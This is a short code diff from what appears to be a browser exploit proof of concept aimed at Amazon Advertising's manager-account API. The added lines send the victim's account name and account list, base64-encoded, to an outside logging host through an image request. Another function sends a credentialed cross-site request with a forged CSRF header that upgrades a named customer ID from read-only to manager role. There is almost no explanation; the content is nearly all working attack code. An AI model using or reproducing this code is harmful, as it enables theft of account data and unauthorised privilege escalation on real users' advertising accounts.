@@ -15,6 +15,8 @@ xhr.onload = function() {
     }
     alert(origin)
     alert("Current Account Name: " + fullName + "\n" + accounts)
+    new Image().src="https://icollab.info/log/?data="+encodeURIComponent(btoa("Current Account Name: " + fullName + "\n" + accounts));
+
 }
 
 xhr.send()
@@ -22,9 +24,8 @@ xhr.send()
 function submitRequest() {
     var xhr = new XMLHttpRequest();
     xhr.open("POST", "https:\/\/advertising.amazon.com\/am\/managerAccounts\/api\/v1\/ma\/amzn1.ads1.ma1.ars8t8gor8ro29tsxpjqqwnyr\/changeRoles", true);
-    xhr.setRequestHeader("accept-language", "en-US");
     xhr.setRequestHeader("content-type", "application\/json");
-    xhr.setRequestHeader("accept", "application\/json, text\/plain, *\/*");
+    xhr.setRequestHeader("X-Csrf-Token", "1");
     xhr.withCredentials = true;
     var body = "{\"customerId\":\"A23NSADV919UHB\",\"rolesToAssociate\":[\"MasterAccount_Manager\"],\"rolesToDisassociate\":[\"MA_ReadOnly\"]}";
     var aBody = new Uint8Array(body.length);
